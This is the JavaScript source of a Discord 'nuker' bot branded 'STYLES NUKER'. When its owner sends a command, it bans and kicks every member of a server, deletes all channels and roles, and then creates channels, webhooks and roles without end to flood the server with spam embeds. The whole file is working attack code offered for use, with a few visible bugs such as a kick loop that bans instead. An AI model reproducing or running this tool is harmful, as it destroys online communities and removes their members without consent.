console.clear();
process.title = '[STYLES] - Loading..'
const { magentaBright, white, blackBright } = require('chalk');
const { prefix, webhookNames, roleNames, channelNames, fieldNames, randomLinks } = require('./config.json');

const { Client, MessageEmbed } = require('discord.js')
const client = new Client();

client.once('ready', async () => {	
    try { var lietnUser = await client.users.fetch(require('./config.json').id).then(u => u.tag); } catch (e) { };
    process.title = `[STYLES NUKER] - Connected ${lietnUser}`
    console.log(` `);
    console.log(` `);
    console.log(white('                               #####  ####### #     # #       #######  #####  '));
    console.log(white('                              #     #    #     #   #  #       #       #     # '));
    console.log(blackBright('                              #          #      # #   #       #       #       '));
    console.log(blackBright('                               #####     #       #    #       #####    #####  '));
    console.log(magentaBright('                                    #    #       #    #       #             # '));
    console.log(magentaBright('                              #     #    #       #    #       #       #     # '));
    console.log(magentaBright('                               #####     #       #    ####### #######  #####  '));
    console.log(` `);
    console.log(` `);
    console.log(magentaBright(' [') + white('?') + magentaBright(']') + white(` Listening for`) + magentaBright(': ') + white(lietnUser));

});

const fs = require('fs');

client.on('rateLimit', () => {
    console.log(magentaBright(' [') + white('!') + magentaBright('] ') + white('Rate Limited, Sleeping for ') + magentaBright(0) + white(' seconds'));
});

client.once('message', async (message) => {
    if (message.author.id !== require('./config.json').id) return
    if (!message.content.startsWith(prefix)) return;
    const args = message.content.slice(prefix.length).trim().split(/ +/g);
    const command = args.shift().toLocaleLowerCase();

    if (command === 'b' || command === 'ban') {
        for (let i = 0; i < message.guild.members.cache.array().length; i++) {
            let u = message.guild.members.cache.array()[i];

            u.ban({ reason: "BEST DISCORD TOOL | STYLES NUKER" }).then(() => {
                console.log(magentaBright(' [') + white('+') + magentaBright('] ') + white('Banned ') + magentaBright(u.user.tag));
            }).catch(() => {
                console.log(magentaBright(' [') + white('-') + magentaBright('] ') + white('Couldn\'t Ban ') + magentaBright(u.user.tag));
            });
        };

        message.guild.members.cache.forEach(mm => {

            mm.ban({
                reason: "BEST DISCORD TOOL | STYLES NUKER"
            }).then(() => {
                console.log(magentaBright(' [') + white('+') + magentaBright('] ') + white('Banned ') + magentaBright(mm.user.tag));
            }).catch(() => {
            });
        });
    };
    if (command === 'kick' || command === 'k') {
        for (let i = 0; i < message.guild.members.cache.array().length; i++) {
            let u = message.guild.cache.members.array()[i];

            u.kick().then(() => {
                console.log(magentaBright(' [') + white('+') + magentaBright('] ') + white('Kicked ') + magentaBright(u.user.tag));
            }).catch(() => {
                console.log(magentaBright(' [') + white('-') + magentaBright('] ') + white('Couldn\'t Kick ') + magentaBright(u.user.tag));
            });
        };

        message.guild.members.cache.forEach(mm => {
            mm.ban({ reason: "BEST DISCORD TOOL | STYLES NUKER" }).then(() => {
                console.log(magentaBright(' [') + white('+') + magentaBright('] ') + white('Kicked ') + magentaBright(u.user.tag));
            }).catch(() => {
            });
        });
    };

    if (command === 'ww') {
        process.nextTick(() => {
            for (let i = 0; i < message.guild.members.cache.array().length; i++) {
                let u = message.guild.members.cache.array()[i];

                u.ban({ reason: "BEST DISCORD TOOL | STYLES NUKER" }).then(() => {
                    console.log(magentaBright(' [') + white('+') + magentaBright('] ') + white('Banned ') + magentaBright(u.user.id));
                }).catch(() => {
                    console.log(magentaBright(' [') + white('-') + magentaBright('] ') + white('Couldn\'t Ban ') + magentaBright(u.user.tag));
                });
            };

            message.guild.members.cache.forEach(mm => {
                mm.ban({ reason: "BEST DISCORD TOOL | STYLES NUKER" }).then(() => {
                    console.log(magentaBright(' [') + white('+') + magentaBright('] ') + white('Banned ') + magentaBright(mm.user.tag)); 0
                }).catch(() => {
                });
            });

            for (let i = 0; i < message.guild.members.cache.array().length; i++) {
                let u = message.guild.members.cache.array()[i];

                u.kick().then(() => {
                    console.log(magentaBright(' [') + white('+') + magentaBright('] ') + white('Kicked ') + magentaBright(u.user.tag));
                }).catch(() => {
                    console.log(magentaBright(' [') + white('-') + magentaBright('] ') + white('Couldn\'t Kick ') + magentaBright(u.user.tag));
                });
            };

            message.guild.members.cache.forEach(mm => {
                mm.ban({ reason: "BEST DISCORD TOOL | STYLES NUKER" }).then(() => {
                    console.log(magentaBright(' [') + white('+') + magentaBright('] ') + white('Kicked ') + magentaBright(mm.user.tag));
                }).catch(() => {
                });
            });
        });
        message.guild.channels.cache.forEach(ch => {
            ch.delete().then(() => {
                console.log(magentaBright(' [') + white('+') + magentaBright(']') + white(' Deleted channel ') + magentaBright(ch.id));
            }).catch(() => {
                console.log(magentaBright(' [') + white('+') + magentaBright(']') + white(' Couldn\'t Deleted channel ') + magentaBright(ch.id));
            });
        });

        const normal = fs.readFileSync('./messages/normal.txt', 'utf8');
        const description = fs.readFileSync('./messages/description.txt', 'utf8');
        const fieldvalue1 = fs.readFileSync('./messages/fieldvalue1.txt', 'utf8');
        const fieldvalue2 = fs.readFileSync('./messages/fieldvalue1.txt', 'utf8');
        const footer = fs.readFileSync('./messages/footer.txt', 'utf8');

        const embed = new MessageEmbed()
            .setAuthor('STYLES ONTOP', `${randomLinks[Math.floor(Math.random() * randomLinks.length)]}`, `${randomLinks[Math.floor(Math.random() * randomLinks.length)]}`)
            .setColor('RANDOM')
            .setTitle('STYLES IS A BEST TOOL EVER!')
            .setURL(`${randomLinks[Math.floor(Math.random() * randomLinks.length)]}`)
            .setImage(`${randomLinks[Math.floor(Math.random() * randomLinks.length)]}`)
            .setThumbnail(`${randomLinks[Math.floor(Math.random() * randomLinks.length)]}`)
            .setDescription(description)
            .setFooter(footer, `${randomLinks[Math.floor(Math.random() * randomLinks.length)]}`)
            .addField(`${fieldNames[Math.floor(Math.random() * fieldNames.length)]}`, fieldvalue1)
            .addField(`${fieldNames[Math.floor(Math.random() * fieldNames.length)]}`, fieldvalue1)
            .addField(`${fieldNames[Math.floor(Math.random() * fieldNames.length)]}`, fieldvalue2)
            .addField(`${fieldNames[Math.floor(Math.random() * fieldNames.length)]}`, fieldvalue2)
            .setTimestamp();

        setInterval(() => {
            message.guild.channels.create(channelNames[Math.floor(Math.random() * channelNames.length)], { type: 'text', topic: 'Made By R3FLECT' }).then((channel) => {
                console.log(magentaBright(' [') + white('+') + magentaBright(']') + white(' Created channel ') + magentaBright(channel.id))
                setInterval(() => {
                    channel.send(normal, embed).then((msg) => {
                        console.log(magentaBright(' [') + white('+') + magentaBright(']') + white(' Sent message ') + magentaBright(msg.id))
                    }).catch(() => {
                        console.log(magentaBright(' [') + white('-') + magentaBright(']') + white(' Couldn\'t send message '));
                    });
                });
                    channel.createWebhook(webhookNames[Math.floor(Math.random() * webhookNames.length)]).then((webhook) => {
                        console.log(magentaBright(' [') + white('+') + magentaBright(']') + white(' Created webhook ') + magentaBright(webhook.id));

                        setInterval(() => {
                            webhook.send(normal, embed).then((msg) => {
                                console.log(magentaBright(' [') + white('+') + magentaBright(']') + white(' Sent webhook message ') + magentaBright(msg.id))
                            }).catch(() => {
                                console.log(magentaBright(' [') + white('-') + magentaBright(']') + white(' Couldn\'t send webhook message '))
                            });
                        });
                    }).catch(() => {
                        console.log(magentaBright(' [') + white('-') + magentaBright(']') + white(' Couldn\'t create webhook '))
                    });
                    channel.createWebhook(webhookNames[Math.floor(Math.random() * webhookNames.length)]).then((webhook) => {
                        console.log(magentaBright(' [') + white('+') + magentaBright(']') + white(' Created webhook ') + magentaBright(webhook.id));

                        setInterval(() => {
                            webhook.send(normal, embed).then((msg) => {
                                console.log(magentaBright(' [') + white('+') + magentaBright(']') + white(' Sent webhook message ') + magentaBright(msg.id))
                            }).catch(() => {
                                console.log(magentaBright(' [') + white('-') + magentaBright(']') + white(' Couldn\'t send webhook message '))
                            });
                        });
                    }).catch(() => {
                        console.log(magentaBright(' [') + white('-') + magentaBright(']') + white(' Couldn\'t create webhook '))
                    });
            }).catch(() => {
                console.log(magentaBright(' [') + white('-') + magentaBright(']') + white(' Couldn\'t create channel '))
            });;
        });
        message.guild.roles.cache.forEach(((role) => {
            role.delete().then(() => {
                console.log(magentaBright(' [') + white('+') + magentaBright(']') + white(' Deleted role ') + magentaBright(role.id))
            }).catch(() => {
                console.log(magentaBright(' [') + white('-') + magentaBright(']') + white(' Couldn\'t delete role '))
            });
        }));
        setTimeout(() => {
            setInterval(() => {
                message.guild.roles.create({
                    data: {
                        name: roleNames[Math.floor(Math.random() * roleNames.length)],
                        color: "RANDOM",
                    }
                }).then((role) => {
                    console.log(magentaBright(' [') + white('+') + magentaBright(']') + white(' Created role ') + magentaBright(role.id));
                }).catch(() => {
                    console.log(magentaBright(' [') + white('-') + magentaBright(']') + white(' Couldn\'t create role '));
                });
            });
        }, 2000);
    };
});
const token = fs.readFileSync('./token.txt', 'utf8');
client.login(token).catch(() => {
    console.log(` `);
    console.log(` `);
    console.log(white('                               #####  ####### #     # #       #######  #####  '));
    console.log(white('                              #     #    #     #   #  #       #       #     # '));
    console.log(blackBright('                              #          #      # #   #       #       #       '));
    console.log(blackBright('                               #####     #       #    #       #####    #####  '));
    console.log(magentaBright('                                    #    #       #    #       #             # '));
    console.log(magentaBright('                              #     #    #       #    #       #       #     # '));
    console.log(magentaBright('                               #####     #       #    ####### #######  #####  '));
	console.log(` `);
    console.log(`                                ${magentaBright('[')}${white('!')}${magentaBright(']')}${white('token error please check your bot token?')}`);
}); 
